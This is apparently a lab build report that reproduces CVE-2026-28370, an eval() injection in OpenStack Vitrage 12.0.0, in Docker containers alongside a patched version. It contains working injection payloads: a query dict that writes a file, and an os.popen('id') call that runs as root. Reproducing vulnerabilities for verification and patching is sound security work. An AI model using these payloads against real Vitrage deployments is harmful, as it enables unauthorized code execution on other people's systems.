# Lab Build Report: CVE-2026-28370

## Lab Architecture

**Type**: Dual container (vulnerable + patched comparison)

The lab demonstrates CVE-2026-28370 using standalone Python environments with OpenStack Vitrage installed from source. The vulnerability in `vitrage/graph/query.py` can be triggered by directly importing and calling `create_predicate()` -- no full OpenStack deployment (Keystone, RabbitMQ, database) is required.

### Container Topology

| Container | Image | Role | Description |
|---|---|---|---|
| `cve-2026-28370-vulnerable` | `lab-vulnerable` (built from `Dockerfile.vulnerable`) | Vulnerable target | OpenStack Vitrage 12.0.0 with the `eval()` injection in `query.py` |
| `cve-2026-28370-patched` | `lab-patched` (built from `Dockerfile.patched`) | Patched target | OpenStack Vitrage 12.0.1 with `eval()` removed |

### Rationale for Standalone Approach

The vulnerability is in a pure Python function (`create_predicate()` in `vitrage/graph/query.py`) that:
1. Takes a Python dict as input
2. Builds a string expression from it
3. Passes it to `eval()`

This can be fully demonstrated by importing and calling the function directly. A full OpenStack deployment would add massive complexity (Keystone, RabbitMQ, MariaDB, multiple Vitrage services) without changing the exploit mechanics.

---

## Container Details

### cve-2026-28370-vulnerable

| Property | Value |
|---|---|
| **Container Name** | `cve-2026-28370-vulnerable` |
| **Base Image** | `python:3.10-slim-bookworm` |
| **Vitrage Version** | 12.0.0 (tag `12.0.0`, commit `2e5eb67d`) |
| **Python Version** | 3.10 |
| **Vulnerable File** | `/opt/vitrage/vitrage/graph/query.py` |
| **Vulnerable Function** | `create_predicate()` -> `eval()` on line 70 |
| **Verification Script** | `/opt/verify_vuln.py` |
| **Evidence Directory** | `/tmp/poc_evidence/` |
| **Network** | `lab-net` (bridge) |
| **Ports** | None exposed (standalone Python testing) |

### Installed Software

- OpenStack Vitrage 12.0.0 (installed from source via `pip install .`)
- All Python dependencies from `requirements.txt` (oslo.log, oslo.config, pecan, networkx, etc.)
- Python 3.10 runtime

---

## Build Status

| Component | Status | Notes |
|---|---|---|
| `lab-vulnerable` image | **SUCCESS** | Built from source at tag 12.0.0 |
| Container startup | **SUCCESS** | Running with `sleep infinity` for interactive testing |
| Vitrage import | **SUCCESS** | `from vitrage.graph.query import create_predicate` works |
| Version verification | **SUCCESS** | `vitrage.__version__` reports `12.0.0` |
| Benign query test | **SUCCESS** | Normal queries work correctly |
| Value injection test | **EXPLOITABLE** | Arbitrary code execution via query value |
| Key injection test | **EXPLOITABLE** | Arbitrary code execution via query key |
| OS command execution | **EXPLOITABLE** | `__import__('os').popen('id')` executes as root |

### Workarounds Applied

None needed -- the build was clean on the first attempt.

---

## Start/Stop Commands

```bash
# Start the lab
cd CVE-2026-28370
docker compose up -d

# Stop the lab
docker compose down

# Rebuild (if Dockerfile changes)
docker compose build --no-cache

# Full reset
docker compose down -v && docker compose up -d
```

---

## Verification

### Run the built-in verification script

```bash
docker exec cve-2026-28370-vulnerable python3 /opt/verify_vuln.py
```

**Expected output** (abbreviated):
```
[+] PASS: Benign queries work correctly
[+] PASS: Arbitrary code execution confirmed via VALUE injection
[+] PASS: OS command execution works
[+] PASS: Code execution confirmed via KEY injection
[+] CVE-2026-28370 is CONFIRMED EXPLOITABLE in this environment
```

### Manual verification

```bash
# Verify vitrage version
docker exec cve-2026-28370-vulnerable python3 -c "import vitrage; print(vitrage.__version__)"
# Expected: 12.0.0

# Verify eval() is present in vulnerable function
docker exec cve-2026-28370-vulnerable python3 -c "
import inspect
from vitrage.graph.query import create_predicate
print([l.strip() for l in inspect.getsource(create_predicate).split('\n') if 'eval' in l])
"
# Expected: ['return eval(expression)']

# Verify _evaluable_str does NOT escape quotes
docker exec cve-2026-28370-vulnerable python3 -c "
from vitrage.graph.query import _evaluable_str
print(_evaluable_str(\"hello'world\"))
"
# Expected: 'hello'world'  (unescaped -- vulnerable!)
```

### Interactive Python shell for PoC development

```bash
docker exec -it cve-2026-28370-vulnerable python3
```

```python
from vitrage.graph.query import create_predicate

# Benign query (normal usage)
pred = create_predicate({"==": {"CATEGORY": "ALARM"}})

# Malicious query (eval injection)
payload = {"==": {"x": "' + str(open('/tmp/pwned','w').write('EXPLOITED')) + '"}}
pred = create_predicate(payload)

# Invoke the predicate to trigger the injected code
class V:
    def get(self, k): return ""
pred(V())

# Check: import os; os.path.exists('/tmp/pwned') -> True
```

---

## Files

| File | Purpose |
|---|---|
| `Dockerfile.vulnerable` | Builds Vitrage 12.0.0 from source |
| `Dockerfile.patched` | Builds Vitrage 12.0.1 from source |
| `docker-compose.yml` | Orchestrates the vulnerable and patched containers |
| `verify_vuln.py` | Automated verification script (baked into vulnerable image) |

---

## Known Issues

None. The lab builds and runs cleanly with no workarounds required.
